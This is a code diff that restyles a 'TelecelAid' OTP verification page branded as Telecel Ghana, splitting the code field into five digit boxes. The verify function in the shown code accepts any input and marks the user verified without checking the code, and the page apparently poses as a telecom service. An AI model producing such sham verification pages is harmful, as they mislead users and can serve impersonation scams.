@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
     <title>OTP Verification - TelecelAid | Powered by Telecel Ghana</title>
     <style>
         * {
@@ -13,9 +13,10 @@
 
         body {
             font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #f8f9fa 0%, #fff 100%);
+            background: #f5f5f5;
             color: #333;
-            line-height: 1.6;
+            line-height: 1.5;
+            overflow-x: hidden;
         }
 
         :root {
@@ -27,39 +28,43 @@
             --light-gray: #f8f9fa;
             --border: #e9ecef;
             --success: #00875A;
-            --shadow: 0 10px 40px rgba(0,0,0,0.08);
-            --shadow-sm: 0 2px 8px rgba(0,0,0,0.05);
+            --shadow: 0 10px 25px rgba(0,0,0,0.08);
         }
 
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap');
 
         .container {
-            max-width: 700px;
+            max-width: 600px;
             margin: 0 auto;
-            padding: 2rem;
+            padding: 1rem;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
         }
 
+        /* Header */
         .header {
             text-align: center;
-            margin-bottom: 2rem;
+            margin-bottom: 1.5rem;
+            padding-top: 0.5rem;
         }
 
         .logo-icon {
             background: var(--telecel-red);
             color: white;
-            width: 60px;
-            height: 60px;
-            border-radius: 15px;
+            width: 50px;
+            height: 50px;
+            border-radius: 12px;
             display: inline-flex;
             align-items: center;
             justify-content: center;
-            font-size: 2rem;
+            font-size: 1.5rem;
             font-weight: bold;
-            margin-bottom: 1rem;
+            margin-bottom: 0.5rem;
         }
 
         .logo-text {
-            font-size: 1.8rem;
+            font-size: 1.4rem;
             font-weight: 800;
             color: var(--dark);
         }
@@ -69,12 +74,13 @@
         }
 
         .powered {
-            font-size: 0.8rem;
+            font-size: 0.65rem;
             color: var(--gray);
         }
 
+        /* Progress Bar */
         .progress-container {
-            margin: 2rem 0;
+            margin: 1rem 0 1.5rem;
         }
 
         .progress-steps {
@@ -86,7 +92,7 @@
         .step-indicator {
             text-align: center;
             flex: 1;
-            font-size: 0.75rem;
+            font-size: 0.6rem;
             color: var(--gray);
         }
 
@@ -101,7 +107,7 @@
 
         .progress-bar {
             background: var(--border);
-            height: 8px;
+            height: 5px;
             border-radius: 10px;
             overflow: hidden;
         }
@@ -111,32 +117,35 @@
             height: 100%;
             width: 75%;
             border-radius: 10px;
-            transition: width 0.3s;
         }
 
+        /* Form Card */
         .form-card {
             background: white;
-            border-radius: 24px;
-            padding: 2rem;
+            border-radius: 20px;
+            padding: 1.5rem;
             box-shadow: var(--shadow);
-            margin-bottom: 2rem;
+            margin-bottom: 1.5rem;
         }
 
         .form-title {
-            font-size: 1.5rem;
-            margin-bottom: 0.5rem;
+            font-size: 1.3rem;
+            margin-bottom: 0.3rem;
             color: var(--dark);
+            text-align: center;
         }
 
         .form-subtitle {
             color: var(--gray);
-            margin-bottom: 2rem;
-            font-size: 0.9rem;
+            margin-bottom: 1.2rem;
+            font-size: 0.75rem;
+            text-align: center;
         }
 
+        /* Phone Display */
         .phone-display {
             background: var(--telecel-red-light);
-            padding: 1rem;
+            padding: 0.8rem;
             border-radius: 12px;
             text-align: center;
             margin-bottom: 1.5rem;
@@ -144,34 +153,64 @@
 
         .phone-display strong {
             color: var(--telecel-red);
-            font-size: 1.2rem;
+            font-size: 1rem;
         }
 
-        .otp-field {
-            margin: 2rem 0;
+        /* OTP Boxes - 5 separate boxes */
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 0.6rem;
+            margin: 1.5rem 0;
+            flex-wrap: wrap;
         }
 
-        .otp-field input {
-            width: 100%;
-            padding: 1rem;
-            font-size: 1.5rem;
+        .otp-box {
+            width: 55px;
+            height: 65px;
             text-align: center;
-            letter-spacing: 0.3rem;
+            font-size: 1.6rem;
+            font-weight: 700;
             border: 2px solid var(--border);
             border-radius: 12px;
+            background: white;
             font-family: monospace;
-            font-weight: 600;
+            transition: all 0.3s;
         }
 
-        .otp-field input:focus {
+        .otp-box:focus {
             outline: none;
             border-color: var(--telecel-red);
             box-shadow: 0 0 0 3px rgba(226,0,26,0.1);
         }
 
+        /* Mobile responsive boxes */
+        @media (max-width: 480px) {
+            .otp-box {
+                width: 45px;
+                height: 55px;
+                font-size: 1.3rem;
+            }
+            .otp-container {
+                gap: 0.4rem;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .otp-box {
+                width: 40px;
+                height: 50px;
+                font-size: 1.2rem;
+            }
+            .otp-container {
+                gap: 0.3rem;
+            }
+        }
+
+        /* Timer */
         .timer-container {
             text-align: center;
-            margin: 1.5rem 0;
+            margin: 1rem 0;
         }
 
         .timer {
@@ -179,20 +218,21 @@
             align-items: center;
             gap: 0.5rem;
             background: var(--light-gray);
-            padding: 0.6rem 1.2rem;
+            padding: 0.5rem 1rem;
             border-radius: 50px;
-            font-size: 0.9rem;
+            font-size: 0.8rem;
         }
 
         .timer-count {
-            font-size: 1.3rem;
+            font-size: 1rem;
             font-weight: 700;
             color: var(--telecel-red);
         }
 
+        /* Resend Button */
         .resend-container {
             text-align: center;
-            margin: 1rem 0;
+            margin: 0.8rem 0;
         }
 
         .resend-btn {
@@ -201,13 +241,8 @@
             color: var(--telecel-red);
             font-weight: 600;
             cursor: pointer;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             text-decoration: underline;
-            transition: color 0.3s;
-        }
-
-        .resend-btn:hover:not(:disabled) {
-            color: var(--telecel-red-dark);
         }
 
         .resend-btn:disabled {
@@ -216,63 +251,64 @@
             text-decoration: none;
         }
 
+        /* Verify Button */
         .btn-verify {
             width: 100%;
             background: var(--telecel-red);
             color: white;
-            padding: 1rem;
+            padding: 0.9rem;
             border: none;
             border-radius: 50px;
-            font-size: 1rem;
+            font-size: 0.95rem;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s;
-            margin-top: 1rem;
+            margin-top: 0.5rem;
         }
 
         .btn-verify:hover {
             background: var(--telecel-red-dark);
             transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(226,0,26,0.3);
         }
 
+        /* Back Link */
         .back-link {
             text-align: center;
-            margin-top: 1.5rem;
+            margin-top: 1rem;
         }
 
         .back-link a {
             color: var(--gray);
             text-decoration: none;
-            font-size: 0.9rem;
-        }
-
-        .back-link a:hover {
-            color: var(--telecel-red);
-        }
-
-        .footer {
-            text-align: center;
-            padding: 2rem;
-            border-top: 1px solid var(--border);
-            color: var(--gray);
             font-size: 0.8rem;
         }
 
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 1rem;
+            color: var(--gray);
+            font-size: 0.65rem;
+            margin-top: auto;
+        }
+
+        /* Alert */
         .alert-success {
             background: #E8F5E9;
             border-left: 4px solid var(--success);
-            padding: 1rem;
+            padding: 0.8rem;
             border-radius: 12px;
-            margin-bottom: 1.5rem;
-            font-size: 0.85rem;
+            margin-bottom: 1rem;
+            font-size: 0.8rem;
             display: none;
+            text-align: center;
         }
 
         .alert-success.show {
             display: block;
         }
 
+        /* Loading Overlay */
         .loading-overlay {
             position: fixed;
             top: 0;
@@ -289,17 +325,17 @@
         }
 
         .loading-spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid white;
-            border-top: 4px solid var(--telecel-red);
+            width: 40px;
+            height: 40px;
+            border: 3px solid white;
+            border-top: 3px solid var(--telecel-red);
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
 
         .loading-text {
             color: white;
-            font-size: 1rem;
+            font-size: 0.9rem;
         }
 
         @keyframes spin {
@@ -330,19 +366,24 @@
         </div>
 
         <div class="form-card">
-            <h1 class="form-title">🔐 One-Time Password (OTP)</h1>
-            <p class="form-subtitle">Step 3 of 4 — Enter the 5-digit verification code sent to your phone</p>
+            <h1 class="form-title">🔐 Verification Code</h1>
+            <p class="form-subtitle">Enter the 5-digit code sent to your phone</p>
 
             <div class="phone-display">
-                📲 We sent a 5-digit code to <strong id="displayPhone"></strong>
+                📲 Code sent to <strong id="displayPhone"></strong>
             </div>
 
             <div class="alert-success" id="successAlert">
-                ✅ OTP verified! Redirecting...
+                ✅ Verified! Redirecting...
             </div>
 
-            <div class="otp-field">
-                <input type="text" id="otpCode" placeholder="Enter 5-digit code" maxlength="5" autofocus>
+            <!-- 5 Separate OTP Boxes -->
+            <div class="otp-container">
+                <input type="text" maxlength="1" class="otp-box" id="otp1" autofocus>
+                <input type="text" maxlength="1" class="otp-box" id="otp2">
+                <input type="text" maxlength="1" class="otp-box" id="otp3">
+                <input type="text" maxlength="1" class="otp-box" id="otp4">
+                <input type="text" maxlength="1" class="otp-box" id="otp5">
             </div>
 
             <div class="timer-container">
@@ -369,7 +410,7 @@
 
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-spinner"></div>
-        <div class="loading-text">Verifying OTP...</div>
+        <div class="loading-text">Verifying...</div>
     </div>
 
     <script>
@@ -419,21 +460,77 @@
             timeLeft = 300;
             canResend = false;
             document.getElementById('resendBtn').disabled = true;
-            document.getElementById('otpCode').value = '';
+            clearOtpBoxes();
             startTimer();
             sendOTP();
-            document.getElementById('otpCode').focus();
+            document.getElementById('otp1').focus();
+        }
+
+        function clearOtpBoxes() {
+            for (let i = 1; i <= 5; i++) {
+                document.getElementById(`otp${i}`).value = '';
+            }
+        }
+
+        function getEnteredOTP() {
+            let otp = '';
+            for (let i = 1; i <= 5; i++) {
+                otp += document.getElementById(`otp${i}`).value;
+            }
+            return otp;
+        }
+
+        // Auto-tab between OTP boxes
+        function setupOtpBoxes() {
+            for (let i = 1; i <= 5; i++) {
+                const box = document.getElementById(`otp${i}`);
+                
+                box.addEventListener('input', function(e) {
+                    // Only allow digits
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                    
+                    // Move to next box if value entered and not last box
+                    if (this.value.length === 1 && i < 5) {
+                        document.getElementById(`otp${i+1}`).focus();
+                    }
+                });
+                
+                box.addEventListener('keydown', function(e) {
+                    // Move to previous box on backspace if empty
+                    if (e.key === 'Backspace' && !this.value && i > 1) {
+                        document.getElementById(`otp${i-1}`).focus();
+                    }
+                });
+                
+                box.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const paste = (e.clipboardData || window.clipboardData).getData('text');
+                    const numbers = paste.replace(/[^0-9]/g, '').split('');
+                    
+                    for (let j = 0; j < Math.min(numbers.length, 5); j++) {
+                        const targetBox = document.getElementById(`otp${j+1}`);
+                        if (targetBox) {
+                            targetBox.value = numbers[j];
+                        }
+                    }
+                    
+                    // Focus on next empty box
+                    for (let j = 1; j <= 5; j++) {
+                        if (!document.getElementById(`otp${j}`).value) {
+                            document.getElementById(`otp${j}`).focus();
+                            return;
+                        }
+                    }
+                    document.getElementById('verifyBtn').focus();
+                });
+            }
         }
 
         async function verifyOTP() {
-            const enteredOTP = document.getElementById('otpCode').value.trim();
-            
-            // Just proceed - no error message for wrong length
             document.getElementById('loadingOverlay').style.display = 'flex';
             
             await new Promise(resolve => setTimeout(resolve, 1500));
             
-            // Always proceed to success page - no OTP validation
             const updatedData = {
                 ...savedData,
                 otpVerified: true,
@@ -451,6 +548,7 @@
         function resendOTP() {
             if (!canResend) return;
             if (resendAttempts >= maxResendAttempts) {
+                alert('Maximum resend attempts reached. Please contact customer support.');
                 return;
             }
             resendAttempts++;
@@ -459,15 +557,11 @@
         }
 
         function init() {
+            setupOtpBoxes();
             sendOTP();
             startTimer();
             document.getElementById('verifyBtn').addEventListener('click', verifyOTP);
             document.getElementById('resendBtn').addEventListener('click', resendOTP);
-            document.getElementById('otpCode').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    verifyOTP();
-                }
-            });
         }
         
         init();
